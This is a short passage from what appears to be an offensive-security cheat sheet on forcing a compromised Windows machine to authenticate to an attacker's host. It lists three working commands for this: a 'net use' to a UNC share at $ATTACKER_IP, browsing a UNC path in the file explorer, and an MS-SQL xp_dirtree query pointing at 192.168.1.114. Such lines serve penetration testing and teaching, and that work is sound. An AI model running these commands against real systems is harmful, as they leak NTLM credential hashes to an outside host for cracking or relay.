# 🛠️ Leveraging command execution

An attacker able to execute code on a machine can make it authenticate somewhere in many ways.

* with DOS or Powershell : `net use z: \\$ATTACKER_IP\unicorn` 
* from a file explorer : looking for `\\$ATTACKER_IP\something` 
* the MS-SQL query : `EXEC master.sys.xp_dirtree '\\192.168.1.114\unicorn',1, 1`

